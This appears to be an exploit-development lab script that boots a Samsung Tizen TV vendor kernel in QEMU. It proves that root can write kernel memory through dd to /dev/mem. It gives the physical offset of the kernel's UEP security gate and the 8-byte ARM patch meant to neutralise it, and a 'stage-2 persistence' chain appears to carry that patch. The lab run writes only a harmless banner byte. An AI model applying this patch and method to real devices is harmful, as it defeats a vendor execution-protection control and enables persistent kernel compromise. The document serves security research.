#!/usr/bin/env bash
# Prove the stage-2 persistence mechanism on the vendor kernel:
#   root userland + busybox dd + /dev/mem -> kernel text write
# (STRICT_DEVMEM defaults to n on ARM 4.1.10; not set in Muse.M-tizen config.)
# Write target: linux_banner (crash-free, observable via /proc/version).
# The real UEP gate offset 0x801d49b8 is read back but NOT written here.
# Usage: LANE=devmem TIMEOUT=60 scripts/09-devmem-proof.sh
set -euo pipefail

LAB=${LAB:-/var/tmp/samsung-lab}
KSRC=$LAB/vendor/linux-4.1.10
ZIMAGE=$KSRC/arch/arm/boot/zImage
LANE=${LANE:-devmem}
ertime=${TIMEOUT:-60}
IRD=$LAB/build/ird-$LANE
OUT=$LAB/out/$LANE-proof.log

# virt->phys: 0xc0008000 -base maps to 0x80008000 (same 1:1 offset)
BANNER_VIRT=$(awk '$3=="linux_banner"{print $1}' "$KSRC/System.map" 2>/dev/null || true)
[ -n "$BANNER_VIRT" ] || { echo "linux_banner not in System.map"; exit 1; }
BANNER_PHYS=$(( 0x$BANNER_VIRT - 0xc0008000 + 0x80008000 ))
printf 'linux_banner virt=%s phys=0x%x\n' "$BANNER_VIRT" "$BANNER_PHYS"

rm -rf "$IRD"; mkdir -p "$IRD"/bin
cp "$LAB/build/busybox-armhf" "$IRD/bin/busybox"; chmod +x "$IRD/bin/busybox"
for a in sh mount dd cat cmp mknod poweroff echo grep od head; do ln -sf busybox "$IRD/bin/$a"; done
# the 8-byte UEP patch for the read-back demo (same bytes the stick carries)
printf '\x02\x00\xa0\xe3\x1e\xff\x2f\xe1' > "$IRD/uep.patch"
mknod -m 600 "$IRD/dev/console" c 5 1 2>/dev/null || true
mknod -m 666 "$IRD/dev/null" c 1 3 2>/dev/null || true

cat > "$IRD/init" <<'INIT'
#!/bin/sh
mkdir -p /proc /sys /dev /tmp
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs devtmpfs /dev 2>/dev/null
[ -e /dev/mem ] || mknod /dev/mem c 1 1

get_arg() { for a in $(cat /proc/cmdline); do case "$a" in "$1"=*) echo "${a#*=}"; return;; esac; done; }
BANNER_PHYS=$(get_arg lab.bannerphys)

echo "== /proc/version BEFORE =="
cat /proc/version
echo "== banner phys = 0x$BANNER_PHYS =="

echo "== writing 'X' into linux_banner via dd of=/dev/mem =="
printf 'X' > /tmp/x.bin
dd if=/tmp/x.bin of=/dev/mem bs=1 seek=$((0x$BANNER_PHYS)) conv=notrunc 2>&1 | head -1

echo "== /proc/version AFTER =="
cat /proc/version
echo "== banner memory read-back (first byte should be X) =="
dd if=/dev/mem bs=1 skip=$((0x$BANNER_PHYS)) count=8 2>/dev/null | od -c | head -1

echo "== read-back at the real UEP gate phys 0x801d49b8 (NO write in lab) =="
dd if=/dev/mem bs=1 skip=$((0x801d49b8)) count=8 2>/dev/null | od -An -tx1
echo "== what uep.patch contains =="
od -An -tx1 /uep.patch

echo "LAB: devmem proof done"
poweroff -f
INIT
chmod +x "$IRD/init"

( cd "$IRD" && find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -1 ) > "$LAB/build/ird-$LANE.cpio.gz"

set +e
timeout "$ertime" qemu-system-arm \
  -M vexpress-a15 -cpu cortex-a15 -smp 2 -m 1024 \
  -dtb "$KSRC/arch/arm/boot/dts/vexpress-v2p-ca15-tc1.dtb" \
  -kernel "$ZIMAGE" -initrd "$LAB/build/ird-$LANE.cpio.gz" \
  -append "console=ttyAMA0 panic=-1 loglevel=8 lab.bannerphys=$BANNER_PHYS" \
  -nographic -no-reboot 2>&1 | tee "$OUT"
echo
grep -q "LAB: devmem proof done" "$OUT" && echo "=== proof: COMPLETED ===" || echo "=== proof: FAILED ==="
